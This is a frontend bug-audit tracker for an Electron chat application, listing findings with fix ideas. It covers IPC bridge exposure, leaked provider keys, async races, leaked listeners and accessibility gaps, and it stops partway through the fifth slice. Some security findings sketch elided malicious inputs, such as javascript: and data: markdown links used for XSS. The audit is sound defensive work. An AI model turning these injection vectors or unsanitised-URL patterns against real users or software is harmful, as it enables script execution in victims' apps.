# Frontend Bug Audit Tracker

Single source of truth. Read [`README.md`](./README.md) for the session protocol
and the frontend bug-class checklist. Update the status table and append findings
here. Fix phase → [`FIX_PLAN.md`](./FIX_PLAN.md) (created once auditing is far
enough along).

Statuses: `TODO` · `IN PROGRESS` · `DONE (<n> findings)` · `BLOCKED`

## Status

| # | Slice | Status | Last touched | Notes |
|---|-------|--------|--------------|-------|
| F1 | Preload bridge & IPC surface | DONE (6 findings) — ALL FIXED in 57876a2 | 2026-09-08 | 1 high, 2 med, 3 low |
| F2 | App shell, providers, contributions | DONE (7 findings) | 2026-09-07 | 2 med, 5 low |
| F3 | Chat data hooks (backend event sync) | DONE (11 findings) | 2026-09-07 | 1 high, 6 med, 4 low — async races, presence expiry/JID, hierarchy orphans |
| F4 | Chat list & layout & nav UI | DONE (7 findings) | 2026-09-07 | 2 med, 5 low |
| F5 | Message view & rendering | DONE (14 findings) | 2026-09-07 | 1 high, 5 med, 8 low — markdown link XSS, template-button URL scheme, pagination lock-up, reaction self-JID |
| F6 | Message input & composition | DONE (14 findings) | 2026-09-07 | 1 high, 6 med, 7 low — voice note mis-delivery on chat switch, mouse mention pick broken, stale mentions |
| F7 | Search UI | DONE (8 findings) | 2026-09-08 | 1 high, 3 med, 4 low — ChatSearchSidebar out-of-order responses, date-range timezone/inclusive-end |
| F8 | AI chat UI | DONE (13 findings) | 2026-09-08 | 1 high, 6 med, 6 low — no stream abort on session switch (answer lost), citation IPC storm, per-keystroke key persist; markdown XSS checked clean |
| F9 | Extensions / plugins UI | DONE (12 findings) | 2026-09-08 | 4 med, 8 low — plugin webview unsandboxed + no will-navigate lock, all sidebar-panel webviews mounted at once, stale panel theme after toggle, extension-chat history race; plugin content rendered as text (no XSS sink) |
| F10 | Overlays & modals | DONE (13 findings) | 2026-09-08 | 6 med, 7 low — webview insecure-content pref, send/receive cross-wiring, no Escape/focus-trap on common modals, required-checkbox validation gap, optimistic-toggle no-revert |
| F11 | Common components & utils | DONE (8 findings) | 2026-09-08 | 1 high, 2 med, 5 low — plugin SVG XSS, stale avatar on chat switch, isSameJid LID/PN collision |
| F12 | Cross-cutting pass | DONE (8 findings) | 2026-09-08 | 1 crit, 1 high, 4 med, 2 low — no error boundary anywhere (crit), navigation-via-window-event bus loses intents (high), tree-wide unguarded await→setState + fetch-clobbers-events patterns, no error-surface primitive |

## Summary counts

Reconciled 2026-09-08 after all slices F1–F12 complete. 121 findings total.

| Severity | Count |
|----------|-------|
| crit | 1 |
| high | 8 |
| med  | 48 |
| low  | 64 |

Per-slice: F1 (0/1/2/3), F2 (0/0/2/5), F3 (0/1/6/4), F4 (0/0/2/5),
F5 (0/1/5/8), F6 (0/1/6/7), F7 (0/1/3/4), F8 (0/1/6/6), F9 (0/0/4/8),
F10 (0/0/6/7), F11 (0/1/2/5), F12 (1/1/4/2) — columns crit/high/med/low.

**crit:** F12-01 (no error boundary — blank-screen app crash).
**high:** F1-01 (`window.electron` full ipcRenderer + env exposure),
F3-01 (useMessages out-of-order response), F5-01 (TextMessage markdown link
XSS — identity `urlTransform`), F6-01 (voice note delivered to wrong chat on
switch), F7-01 (ChatSearchSidebar out-of-order responses), F8-01 (no stream
abort on AI session switch — answer lost), F11-01 (PluginIcon raw-SVG XSS),
F12-02 (navigation window-event bus drops intents).

## Baseline (record before fix phase)

- `npm run typecheck:web` — not yet recorded
- `npm run test:run -- src/renderer` — not yet recorded (expected ~319 pass)

---

# Findings

## Slice F1 — Preload bridge & IPC surface

Audited: `preload/index.ts`, `preload/overlay-preload.ts`, `preload/panel-preload.ts`,
`preload/index.d.ts`, `renderer/src/services/{api.service,IAPIService}.ts`,
`renderer/src/context/APIContext.tsx`. Cross-checked main-side handlers in
`src/main/ipcHandlers.ts` + `src/main/ipc/ipcGuards.ts` for the trust boundary.

### [F1-01] high — src/preload/index.ts:428,435
**What:** The full `@electron-toolkit/preload` `electronAPI` is exposed to the
renderer as `window.electron`. That object includes `ipcRenderer.invoke/send/
sendSync/on/postMessage` with **no channel allowlist** (any IPC channel is
reachable) and `process` with a `get env()` that returns a copy of the entire
main/preload `process.env`.
**Why it's a bug:** The renderer only ever uses `window.electron.process.versions`
(`components/common/Versions.tsx:4`). Everything else is unused attack surface:
any XSS in the renderer, or a malicious/compromised renderer dependency, can call
every `ipcMain.handle` channel directly (bypassing the curated `window.api`
wrapper) and read secrets out of `process.env`. The `isTrustedSender` guard only
covers a handful of handlers, so most channels are fully exercisable this way.
**Fix idea:** Don't call `exposeElectronAPI()` / expose `electronAPI`. Expose a
hand-written minimal object: `contextBridge.exposeInMainWorld('electron', {
process: { versions: process.versions } })`.
**Status:** fixed
**Fix status:** fixed in 57876a2 — `window.electron` is now a hand-written bridge
exposing only `process.versions`; `index.d.ts` narrowed to
`{ process: { versions: NodeJS.ProcessVersions } }`; `@electron-toolkit/preload`
import dropped. Grep confirms `Versions.tsx` is the only `window.electron`
consumer and nothing references `window.electron.ipcRenderer`. typecheck:web +
typecheck:node green; `Versions.test.tsx` passes.

### [F1-02] med — src/renderer/src/services/api.service.ts:213 (handler src/main/ipcHandlers.ts:399)
**What:** `api.getProviderKeys()` → `get-provider-keys` returns the **plaintext**
AI provider API keys (`AIService.getProviderKeys()` → `aiKeyService.getKeys()`) to
the renderer as `Record<string,string>`.
**Why it's a bug:** The renderer only needs to know whether a provider is
configured (to render the settings UI state) — it never needs the secret value.
Shipping the raw keys into renderer JS memory means any XSS or third-party
renderer script can exfiltrate them, and they show up in a renderer heap
snapshot / devtools. (Backend audit pass 1 follow-up S6-01 already flags leaked
keys.)
**Fix idea:** Return masked values or `Record<string, boolean>`; keep the real
key in main. If a masked preview is needed, send only the last 4 chars.
**Status:** fixed
**Fix status:** fixed in 57876a2 — `AIService.getProviderKeys()` masks each key
to `••••<last4>` (or `••••` / `''`), keeping the plaintext in main. Types stay
`Record<string,string>` so no consumer churn: `AISettingsModal.tsx` still shows
the (now masked) value in the key input and `setProviderKey` still takes the
full new value on edit. New unit test in `AIService.test.ts` (`F1-02: … masks
… last-4 preview`); 13/13 pass. `index.d.ts` / `IAPIService.ts` left as
`Record<string,string>` (accurate for masked strings).

### [F1-03] med — src/preload/overlay-preload.ts:42,46-53
**What:** The overlay preload relays IPC payloads into the guest page with
`window.postMessage({ channel, args: [payload] }, '*')` — wildcard target origin —
for `smartchat:init` (theme tokens) and `smartchat:send` / `smartchat:receive`
(overlay message payloads). Additionally both the `smartchat:send` and
`smartchat:receive` IPC handlers re-post the payload under **both** the
`smartchat:send` and `smartchat:receive` channel names.
**Why it's a bug:** (a) `'*'` means if the overlay `<webview>` navigates to or
embeds any third-party/plugin-controlled origin, that content receives every
overlay payload. (b) The send/receive cross-wiring means a guest listening for
`smartchat:receive` also fires on outbound `smartchat:send` (and vice versa) —
echoed/duplicated events, and outbound data delivered to an inbound handler.
**Fix idea:** Post with the guest's actual origin (or at least the app's known
origin), and keep `send` vs `receive` as distinct one-directional channels.
**Status:** fixed
**Fix status:** fixed in 57876a2 — overlay-preload now relays via
`relayToGuest()` which posts to `window.location.origin` (falls back to `'*'`
only for opaque `file://`/`data:` origins that serialize to `"null"`), and the
`smartchat:send` / `smartchat:receive` IPC handlers each post only their own
channel name — no more cross-posting. Manual code review; preload not
unit-tested. NOTE for F10: `OverlayShell.tsx:107-108` still calls
`webview.send('smartchat:receive', …)` AND `webview.send('smartchat:send', …)`
for every inbound payload — the host-side half of the same cross-wiring, left
for F10 which owns that component.

### [F1-04] low — src/preload/index.ts:205
**What:** `aiChatStream` builds its IPC channel id as `` `ai-chat-${Date.now()}` ``
— millisecond timestamp only, no random/counter component.
**Why it's a bug:** Two AI streams started within the same millisecond (e.g. a
user message + an auto/system prompt fired together) get the same `channelId`,
so their `-chunk` / `-end` / `-error` events collide — chunks from one stream are
delivered to the other's callbacks, and the first `-end` tears down both.
**Fix idea:** Append a random suffix or monotonic counter:
`` `ai-chat-${Date.now()}-${crypto.randomUUID()}` ``.
**Status:** fixed
**Fix status:** fixed in 57876a2 — channelId is now
`` `ai-chat-${Date.now()}-${crypto.randomUUID()}` ``. Manual code review;
typecheck green.

### [F1-05] low — src/preload/index.ts:204-226
**What:** The per-stream `-chunk` / `-end` / `-error` listeners registered by
`aiChatStream` are only removed inside the `-end` and `-error` handlers. There is
no disposer returned to the renderer and `abortAiChat` (invoke only) does not
remove them.
**Why it's a bug:** The main side does send `-end` on abort and on error, so the
normal path is fine, but if a stream never terminates (backend hang, or the AI
component unmounts / the user navigates away and the backend reply is dropped)
the three `ipcRenderer` listeners for that `channelId` stay registered for the
life of the window. Slow listener growth over a long session with many
AI chats.
**Fix idea:** Have `aiChatStream` return a disposer that `removeAllListeners` for
the three channels; call it from the hook's `useEffect` cleanup and on abort.
**Status:** fixed
**Fix status:** fixed in 57876a2 — a module-level `aiChatStreamDisposers`
`Map<channelId, dispose>` is populated per stream; `abortAiChat(channelId)` now
calls the disposer (removing all three listeners) before invoking the main
handler, and `-end`/`-error` dispose + delete the map entry. Kept the return
type as `string` (channelId) to avoid touching the F8 hook. The pure
never-terminates-and-never-aborted path is inherently unbounded but now the
common navigate-away path (which triggers abort) cleans up. Manual code review.

### [F1-06] low — src/preload/panel-preload.ts:64-76
**What:** `__smartchat.api.events.on(event, handler)` uses the module-level
`panelId`, which is `''` until `__smartchat._init(id, tokens)` is called. It also
fire-and-forgets the subscribe (`void ipcRenderer.invoke(...)`).
**Why it's a bug:** A panel script that calls `api.events.on(...)` during module
init (before `_init`) sends `kernel:panel:events:subscribe` with an empty
`panelId` — the subscription silently targets nothing, and the returned cleanup
later unsubscribes `''` too. The discarded invoke result hides a rejected
subscription.
**Fix idea:** Queue `on()` calls until `panelId` is set (resolve in `_init`), and
surface subscribe failures.
**Status:** fixed
**Fix status:** fixed in 57876a2 — `on()` pushes its subscribe thunk onto
`pendingSubscribes` when `panelId` is still `''`; `_init` flushes the queue.
Subscribe now `.catch`es and logs instead of `void`-ing the invoke. Disposer
sets a `disposed` flag so a queued subscribe that was cancelled before `_init`
is skipped, and unsubscribe is a no-op while `panelId` is empty. Manual code
review; typecheck green.


## Slice F2 — App shell, providers, contributions

Audited: `App.tsx`, `main.tsx`, `context/ContributionContext.tsx`, `context/APIContext.tsx`,
`hooks/useContributions.ts`, `utils/whenCondition.ts`, `utils/contributionUtils.tsx`.

### [F2-01] med — src/renderer/src/App.tsx:89
**What:** `handleSetSyncFullHistory` sets `isRegeneratingQr = true`, clears the QR, then
`await api.setSyncFullHistory(full)` with no `try/catch/finally`, and the `onClick` callers
don't `.catch`.
**Why it's a bug:** on the QR screen, clicking a sync-mode option calls this. If the IPC call
rejects (or just never triggers a fresh `onWaQr` because the backend errored), `isRegeneratingQr`
is never reset and `qr` stays `null`, so the QR pane is stuck on the "Generating new QR code..."
spinner forever — the user can't link the device without restarting the app. Also produces an
unhandled promise rejection.
**Fix idea:** wrap in `try { ... } finally { }` (or reset `isRegeneratingQr` on the next
`onWaQr`), and have the backend guarantee a QR re-emit; surface an error toast on reject.
**Status:** open

### [F2-02] med — src/renderer/src/context/ContributionContext.tsx:15-38
**What:** the effect fires `api.getContributions().then(setSnapshot)` and *then* registers
`api.onContributionsUpdated(setSnapshot)`. The initial fetch is not cancelled/superseded when an
update event arrives first.
**Why it's a bug:** if a contribution registry change is pushed from main between effect-mount and
the `getContributions()` promise resolving (plugin activating during startup), the update event
lands first and sets the fresh snapshot, then the slower initial fetch resolves with the older
snapshot and clobbers it. The UI then shows stale contributions (missing menu items / panels)
until the next update. `mounted` guards unmount but not this ordering.
**Fix idea:** track whether an update has already been applied (or a request seq) and ignore the
initial `.then` if so; or subscribe before fetching and treat the fetch as lowest priority.
**Status:** open

### [F2-03] low — src/renderer/src/App.tsx:27-33
**What:** initial `api.getSyncFullHistory().then((full) => setSyncFullHistory(full))` effect has
no mounted/abort guard.
**Why it's a bug:** if `App` unmounts before the IPC resolves (fast transition to `ready`, or
StrictMode remount in dev), `setSyncFullHistory` runs after unmount → React warning; harmless in
prod but inconsistent with the guarded pattern used elsewhere.
**Fix idea:** add a `let alive = true` flag with cleanup, matching `ContributionContext`.
**Status:** open

### [F2-04] low — src/renderer/src/App.tsx:43-51, 132-316
**What:** `onWaConnected` can set `appState = 'connected'` (when `data.isCatchup`), but the render
has branches only for `'ready'`, `'syncing'`, `'qr'`, and an else. `'connected'` falls into the
else branch.
**Why it's a bug:** during a catch-up reconnect the setup card shows the generic init spinner with
whatever text `syncStatus` currently holds (often the stale "Initializing connection..." or a
leftover sync status), which misrepresents the state to the user.
**Fix idea:** give `'connected'` its own copy ("Reconnecting / catching up…") or map it to the
`'syncing'` visual.
**Status:** open

### [F2-05] low — src/renderer/src/utils/contributionUtils.tsx:27-31
**What:** `subMenu: sub.subMenu ? mapSubMenuItems(...) : undefined` and the matching
`onClick: sub.subMenu ? undefined : ...`. An empty array `sub.subMenu === []` is truthy.
**Why it's a bug:** a plugin that declares `subMenu: []` (or one whose children all get filtered
out upstream) produces a menu entry with an empty submenu and no `onClick` — a dead, unclickable
item with a hover arrow.
**Fix idea:** check `sub.subMenu && sub.subMenu.length > 0`.
**Status:** open

### [F2-06] low — src/renderer/src/hooks/useContributions.ts:7-9
**What:** on the "no contributions for this slot" path the hook returns a freshly-allocated `[]`
literal every render.
**Why it's a bug:** consumers that put the result in a `useEffect`/`useMemo` dependency array (or
pass it as a prop to a memoized child) see a new reference every render → effect re-runs / child
re-renders on every parent render while the slot is empty (the common case).
**Fix idea:** return a module-level frozen `EMPTY: [] as const` for the empty path.
**Status:** open

### [F2-07] low — src/renderer/src/utils/whenCondition.ts:42-45
**What:** `neq` is `ctxValue !== value`; when `condition.field` is absent from the context,
`ctxValue` is `undefined` and the comparison is true.
**Why it's a bug:** a `{ field: 'x', op: 'neq', value: 'foo' }` gate is meant to hide a
contribution when `x === 'foo'`, but it also *passes* (shows it) for any context that simply
lacks `x` — likely not the plugin author's intent, and asymmetric with `eq`.
**Fix idea:** treat a missing field as a non-match for `neq`/`nin` (require `condition.field in
context`), or document the semantics explicitly.
**Status:** open

## Slice F3 — Chat data hooks

Files audited: `components/chat/hooks/{useChats,useMessages,useChatHierarchy,useSearch}.ts`,
`hooks/{useChatNavigation,usePresence}.ts` (+ their tests), and the consumers
`ChatLayout.tsx` / `ChatList.tsx` for the real call/render paths. Preload
`on*` wrappers verified to remove the specific listener on cleanup (no leak there).
`loadMore` double-fire on the chat list and the empty-name `open-chat` path are
already recorded as F4-07 / F4-04 — not duplicated here.

### [F3-01] high — src/renderer/src/components/chat/hooks/useMessages.ts:26-76
**What:** `loadInitialMessages` / `performJump` do `const msgs = await api.getMessages(jid,…)`
then `setMessages(msgs)` with no check that `jid` is still the active chat and no
AbortController. The driving effect (:62-76) updates `lastActiveJid.current`
*synchronously* before the await, so a late response can't be detected either.
**Why it's a bug:** rapid chat switching (click chat A, then chat B before A's
fetch resolves). A's `getMessages` resolves after B's → `setMessages` overwrites
B's message list with A's messages while chat B is open and its header/input
still say B. Also `loading` can be left in the wrong state. Classic out-of-order
response bug — the checklist's headline case.
**Fix idea:** capture a request id / `AbortController` per load; in the `.then`
bail if `jid !== activeJidRef.current` (add an `activeJidRef`) or the id is stale.
**Status:** open

### [F3-02] med — src/renderer/src/components/chat/hooks/useMessages.ts:78-95
**What:** `loadMore` awaits `api.getMessages(activeJid, nextPage,…)` then
`setMessages((prev) => [...olderMsgs, ...prev])` with no post-await guard that
`activeJid` is unchanged.
**Why it's a bug:** if the user switches chats (or the chat is closed) while a
"load older messages" fetch is in flight, the resolved older page for chat A is
prepended onto chat B's current message list — B's history now contains A's
messages, with `currentPage` also advanced against the wrong chat.
**Fix idea:** snapshot `activeJid` at call time and discard the result if it no
longer matches `activeJidRef.current`; reset pagination on chat switch (already
done in the effect, but the in-flight call must also be invalidated).
**Status:** open

### [F3-03] med — src/renderer/src/components/chat/hooks/useChats.ts:135-190
**What:** in `onNewMessage`, for a chat not yet in the list the handler
*synchronously* does `chatJidsRef.current.add(chatJidLower)` and then
`await api.getChat(...)`. A second `new-message` for the same new chat arriving
before that await resolves now sees `hasChat === true` and takes the `else`
branch (:191), whose `setChats` does `findIndex(... ) === -1 → return prev`.
**Why it's a bug:** the second (newer) message is silently dropped from the
chat-list row. The first branch then builds the row from the *first* message's
preview text/timestamp, so the sidebar shows an older message as "last message".
Self-heals only on the next event for that chat.
**Fix idea:** queue/coalesce events for a jid whose `getChat` is in flight, or
re-read the latest message after the fetch resolves; don't mark `chatJidsRef`
until the row is actually in state.
**Status:** open

### [F3-04] med — src/renderer/src/components/chat/hooks/useChats.ts:73-96
**What:** the initial `loadChats(1,false)` resolves to `setChats(data)` — a full
replace of the list with the backend page, discarding anything applied to `chats`
state in between.
**Why it's a bug:** on startup the `onNewMessage` / `onChatUpdated` subscriptions
are registered in the same effect *before* `getChats()` resolves. A message or
chat update that arrives during that fetch window updates `chats`, then the
awaited `setChats(data)` wipes it — the chat list briefly shows the new
message/unread bump and then reverts until the next event.
**Fix idea:** merge the fetched page into existing state (like the `append` path
does) instead of replacing, or buffer events received before the first load
completes and replay them.
**Status:** open

### [F3-05] med — src/renderer/src/components/chat/hooks/useChatHierarchy.ts:21-33, 70-103
**What:** Pass 1 puts every chat with a `linkedParentJid` into `childrenByParent`
and adds it to `processedJids`; Pass 2 excludes all processed jids from
`standaloneChats`; Pass 5 only emits children for community roots that are present
in `sortableItems` (i.e. roots that are `isCommunity` and in the current list).
**Why it's a bug:** a subgroup chat whose community root is **not** in the loaded
/ paginated set (root on a later page, or the backend's `outOfWindow` root
injection missed it) is neither a standalone nor emitted under a root → it
disappears from the sidebar completely. The user loses access to an active group
with no indication it exists.
**Fix idea:** after Pass 5, emit any `childrenByParent` entries whose parent was
never rendered as standalone rows (or synthesize a placeholder root).
**Status:** open

### [F3-06] med — src/renderer/src/hooks/usePresence.ts:27-49
**What:** the 2s expiry interval only downgrades entries whose
`lastKnownPresence` is `composing`/`recording` (after 10s). `available` /
`online` presence is never aged out.
**Why it's a bug:** if the backend doesn't reliably push an `unavailable`
presence when a contact goes offline, `getActivePresence` keeps returning
`'online'` indefinitely (it returns online if *any* sub-entry is
available/composing/recording). Chat header / list show a stale "online".
**Fix idea:** also expire `available` after a bounded TTL (e.g. 60s) without a
refresh, or have the hook re-request presence on a timer for the active chat.
**Status:** open

### [F3-07] med — src/renderer/src/hooks/usePresence.ts:57-59 & src/renderer/src/components/chat/ChatList.tsx:146
**What:** presence is stored keyed by the raw `update.remoteJid` and read with an
exact-match lookup: `presences[jid]` in `getActivePresence`, `presences[chat.jid]`
in `ChatList.getPresenceText`. Every other part of the chat layer compares JIDs
with `isSameJid` (case-insensitive, device-suffix tolerant).
**Why it's a bug:** if the presence event's `remoteJid` differs in case or
`:device`/`@lid` form from the `activeJid` / `chat.jid` used for lookup, the
typing / online indicator silently never appears even though the data is present.
**Fix idea:** normalize JIDs to a canonical form on write and on read, or expose a
`getActivePresence` that scans with `isSameJid`.
**Status:** open

### [F3-08] low — src/renderer/src/components/chat/hooks/useChats.ts:73-80
**What:** the non-append branch returns `data` verbatim; only the `append` branch
runs `sortChats`. Every realtime update path (`onNewMessage`, `onChatUpdated`,
`onMessageEdited`, `onMessageStatusUpdated`) re-sorts with the pinned-first /
timestamp comparator.
**Why it's a bug:** the initial (and `reload()`) list order is whatever the
backend returned; if that ordering ever diverges from `sortChats` semantics the
list visibly reshuffles the moment the first event arrives.
**Fix idea:** `return sortChats(data)` in the replace branch too.
**Status:** open

### [F3-09] low — src/renderer/src/components/chat/hooks/useSearch.ts:12,47
**What:** the debounce effect's dep array is `[query, mode, filters]`; `filters`
is compared by reference.
**Why it's a bug:** the current sole caller (`ChatList`) passes a `useState`
value so the ref is stable, but any caller that passes an inline
`filters={{…}}` (or a `useMemo`-less derived object) makes the effect tear down
and recreate the `setTimeout` on every render — while the user is actively
typing / the parent is re-rendering, the debounce timer keeps resetting and the
search request may never fire.
**Fix idea:** memoize `filters` inside the hook (e.g. `JSON.stringify` key) or
document that callers must pass a stable reference.
**Status:** open

### [F3-10] low — src/renderer/src/components/chat/hooks/useChats.ts:19-20 & useChatHierarchy.ts:39,46-50,80
**What:** timestamp fields are fed straight into `BigInt(...)` in the `sortChats`
comparator and the `useChatHierarchy` memo.
**Why it's a bug:** `BigInt` throws synchronously on any non-numeric string
(`BigInt("2026-01-01")`, `BigInt("abc")`). One malformed `lastMessageTimestamp`
from the backend takes down the whole `useMemo` / the `onNewMessage` handler, and
there is no error boundary around `ChatList` — white sidebar.
**Fix idea:** parse defensively (`/^\d+$/` check, or `try/catch` → `0n`).
**Status:** open

### [F3-11] low — src/renderer/src/hooks/usePresence.ts:13-55 (via ChatLayout.tsx:62 & ChatList.tsx:62)
**What:** `usePresence()` is instantiated separately in both `ChatLayout` and
`ChatList`, which are mounted simultaneously.
**Why it's a bug:** two independent `onPresenceUpdate` IPC subscriptions and two
2-second `setInterval` timers run for the whole app lifetime; the two copies of
`presences` state are maintained independently and can briefly disagree (e.g. one
mid-expiry sweep). Minor constant overhead + a duplicated subscription.
**Fix idea:** lift presence into a context/provider (or a shared store) consumed
by both, so there is a single subscription and interval.
**Status:** open

## Slice F4 — Chat list & layout & nav UI

Files audited: `ChatLayout.tsx`, `ChatList.tsx`, `SidebarRail.tsx`,
`ExtensionChatListItem.tsx`, `hooks/useSidebarResize.ts` (+ tests). Community
hierarchy / `useChats` / `useChatHierarchy` logic belongs to F3 and was only
skimmed for the interactions below.

### [F4-01] med — ChatList.tsx:97-111
**What:** the embedding-progress effect calls `setTimeout(() => setIndexingProgress(null), 3000)`
on every `pct === 100` event and never stores or clears the timer; the effect
also has `[]` deps while closing over `api`.
**Why it's a bug:** (a) if the user leaves the chat view (or logs out — `confirmLogout`
does `window.location.reload()`, but route changes / conditional unmounts don't)
within 3s of indexing finishing, the timer fires `setIndexingProgress` on an
unmounted component → React warning + wasted work. (b) If the backend emits
`pct === 100` more than once (retry, multiple index passes in one session) the
timeouts stack and each re-nulls the progress bar, making a subsequent indexing
run's bar flicker away early. Nothing clears the pending timer when a new run
starts (`confirmIndex` sets `setIndexingProgress(0)` but a stale 100%-timer can
still fire 0→null mid-run).
**Fix idea:** keep the timeout id in a ref (or effect-local var), `clearTimeout`
in the effect cleanup and at the top of each new progress handler; add `api` to
deps (it's context-stable so harmless).
**Status:** open

### [F4-02] med — hooks/useSidebarResize.ts:11-24
**What:** `startResizing` attaches `mousemove`/`mouseup` listeners to `document`
and only detaches them in its own `onMouseUp`. There is no `useEffect` cleanup
and no tracking of an in-flight drag.
**Why it's a bug:** if `ChatLayout` unmounts while a resize drag is active (the
resizer only renders when `isAIOpen || isChatSearchOpen`; toggling AI/search off
mid-drag, or a logout reload, removes it), the `mousemove` listener survives and
keeps calling `setSidebarWidth` on the unmounted hook → setState-after-unmount
and a leaked listener that persists for the life of the document. Repeated over a
long session each interrupted drag adds another live `mousemove` handler.
**Fix idea:** store the handler refs and return a `useEffect` cleanup that removes
them; or lift the drag into an effect keyed on an `isResizing` state flag.
**Status:** open

### [F4-03] low — ChatLayout.tsx:136-141
**What:** `api.onExtensionFocus` handler calls `handleOpenExtensionChat(id, id)`
— passing the extension **id** as the display name. The comment says "name
resolved on next render" but no code resolves it.
**Why it's a bug:** when an extension calls `ctx.dedicatedChat.focus()`, the chat
header (`activeName`) and any name-dependent UI show the raw extension id (e.g.
`com.acme.things`) instead of the extension's human name, until an unrelated
`onChatUpdated` event happens to arrive (usually never for a synthetic extension
chat).
**Fix idea:** resolve the name from `useExtensionManager().extensions` (already in
scope) — `extensions.find(e => e.id === id)?.manifest.name ?? id`.
**Status:** open

### [F4-04] low — ChatLayout.tsx:157-178
**What:** the `smartchat:open-chat` window-event effect closes over
`handleOpenExtensionChat` but its dep array is
`[handleSelectChat, activeJid, jumpToMessage]` (missing `handleOpenExtensionChat`
and `api`). Also `jumpToMessage(newTarget).then(...)` has no `.catch`.
**Why it's a bug:** `handleOpenExtensionChat` is currently referentially stable
so no live misbehaviour, but the lying dep array will silently break if that
callback ever gains a real dependency. The un-caught `jumpToMessage` promise
produces an unhandled rejection if the anchor query fails (bad/deleted message
id), and `setTargetMessageId` is never reached so the UI gives no feedback.
**Fix idea:** add the missing deps; `.catch(console.error)` on the jump, and
still clear/indicate on failure.
**Status:** open

### [F4-05] low — ExtensionChatListItem.tsx:27,33
**What:** renders `{chat.name}` and `{chat.lastMessage}` as raw text, whereas
every regular row in `ChatList` wraps the same fields in `<EmojiText>`.
**Why it's a bug:** extension chat titles / last-message previews that contain
emoji shortcodes or custom-emoji tokens render inconsistently (raw `:smile:`
etc.) versus the rest of the list.
**Fix idea:** use `<EmojiText text={chat.name} />` / `<EmojiText text={chat.lastMessage || 'Start a conversation…'} />`.
**Status:** open

### [F4-06] low — ChatList.tsx:483-494
**What:** the community subgroup chips (`<span className="subgroup-tag" onClick=…>`)
are click-only — no `role="button"`, `tabIndex`, or key handler. (The
community expand/collapse control at :464 is correctly a `<button>`.)
**Why it's a bug:** keyboard-only users can expand a community but cannot open a
specific subgroup from the collapsed preview row.
**Fix idea:** render the chips as `<button>` or add `role="button"` + `tabIndex={0}`
+ Enter/Space handling.
**Status:** open

### [F4-07] low — ChatList.tsx:64-71
**What:** `handleScroll` calls `loadMore()` on every scroll event within 50px of
the bottom, with no throttle. `useChats.loadMoreChats` guards with
`if (loading || loadingMore || !hasMore) return`, but `loadingMore` is a state
value — two scroll events fired in the same frame (before the re-render that sets
`loadingMore = true`) both pass the guard.
**Why it's a bug:** a fast flick to the bottom can dispatch two overlapping
page fetches → a duplicated page / skipped cursor in the chat list.
**Fix idea:** guard `loadMoreChats` with a `useRef` in-flight flag (set
synchronously) rather than relying on state; or debounce `handleScroll`.
**Status:** open

## Slice F5 — Message view & rendering

Files audited: `MessageView.tsx`, `MessageItem.tsx`, `MessageInfoModal.tsx`,
`ReactionsDisplay.tsx`, `messages/{TextMessage,MediaMessages,AudioMessage,TemplateMessage,SystemMessage}.tsx`,
`messages/system-stubs/SystemStubRegistry.tsx`, `common/{MessageStatusTick,WaveformPlayer}.tsx`.

### [F5-01] high — src/renderer/src/components/chat/messages/TextMessage.tsx:106
**What:** `<ReactMarkdown urlTransform={(url) => url} …>` overrides react-markdown
10's `defaultUrlTransform` with an identity function, disabling all URL
sanitization. The custom `a` renderer then emits
`<a href={href} target="_blank" rel="noopener noreferrer">` for any href that
isn't `mention:` / `https://emoji.local/`.
**Why it's a bug:** message text is attacker-controlled (any WhatsApp contact /
group member / business template body — `TemplateMessage` also routes `mainBody`
through this component). A message containing `[tap](javascript:…)` or
`[x](data:text/html,…)` now renders a live link; clicking it runs script in the
renderer origin (or navigates it). `defaultUrlTransform` exists precisely to
strip `javascript:`/`data:`/`vbscript:`. Raw HTML is still escaped (no
`rehype-raw`), so links are the vector.
**Fix idea:** don't use identity. Wrap `defaultUrlTransform` (import from
`react-markdown`) and only additionally allow the `mention:` scheme (and the
`https://emoji.local/` host) that the preprocessors rely on; keep its
`javascript:`/`data:` stripping for everything else.
**Status:** open

### [F5-02] med — src/renderer/src/components/chat/messages/TemplateMessage.tsx:152-155
**What:** URL / call template buttons do `window.open(button.payload, '_blank', …)`
/ `window.open(\`tel:${button.payload}\`)` with no scheme validation. `payload`
comes straight from `b.urlButton.url` / `params.url` / `params.phone_number` in
the (business- or spam-authored) template message.
**Why it's a bug:** a template button labelled "View order" can carry
`javascript:…`, `file:///…`, or another scheme as its URL; the user taps a
normal-looking button and the renderer opens it. `tel:` interpolation is also
unescaped.
**Fix idea:** only open `payload` if `/^https?:$/` (parse with `new URL`);
render other schemes as inert text. Encode the phone number for `tel:`.
**Status:** open

### [F5-03] med — src/renderer/src/components/chat/MessageView.tsx:124-144
**What:** `handleScroll` sets `isLoadingRef.current = true` / `setLoadingMore(true)`
then `const count = await onLoadMore()`. Those flags are only cleared again
(a) here when `!count || count === 0`, or (b) in the `[messages]` effect at
:114-121 *if* `loadingMore` is true when `messages` next changes.
**Why it's a bug:** if `onLoadMore()` rejects (backend error) the `await` throws
out of the async scroll handler — unhandled rejection — and `isLoadingRef`
stays `true`, so **upward pagination is permanently dead for that chat** until
remount. Same lock-up if it resolves with `count > 0` but the prepend is a
no-op (all fetched messages were duplicates already in state) — `messages`
reference doesn't change, the :114 effect never runs, `loadingMore` stays true.
**Fix idea:** wrap in `try/finally` that always clears both flags; reconcile
against an actual length delta rather than the returned count.
**Status:** open

### [F5-04] med — src/renderer/src/components/chat/MessageView.tsx:52-62
**What:** the "reset pagination on chat switch" effect only does
`setHasMore(true)` / `isInitialRenderForChat.current = true` when
`messages.length <= 50`.
**Why it's a bug:** open chat A, scroll up so `hasMore` becomes `false` (or just
load a few pages), then jump to a message in chat B via search/context so B
mounts with a >50-message window. The `firstId !== prevMessageId.current` branch
is taken but the `<= 50` guard fails, so B inherits A's `hasMore === false` —
the user cannot load older messages in B — and `isInitialRenderForChat` isn't
re-armed so the initial scroll-to-bottom/position is also skipped.
**Fix idea:** key the reset on the chat jid actually changing (pass it as a
prop) rather than on `messages[0].id` + a length heuristic.
**Status:** open

### [F5-05] med — src/renderer/src/components/chat/MessageItem.tsx:282-286
**What:** `isMeReaction` returns `senderId.split('@')[0] === myJid.split('@')[0]`
— it does not strip a `:device` suffix, unlike `isQuotedMe` two dozen lines
later which does `.split('@')[0].split(':')[0]`.
**Why it's a bug:** if a reaction's `senderId` arrives as
`123456:7@s.whatsapp.net` (device-suffixed, as reaction/receipt JIDs often are)
it won't match `myJid`, so `handleReactClick` doesn't find your existing
reaction and calls `reactMessage(jid, id, emoji)` again instead of clearing it
with `''` — your own reaction can't be toggled off from the quick bar, and the
"active" highlight on your emoji is wrong.
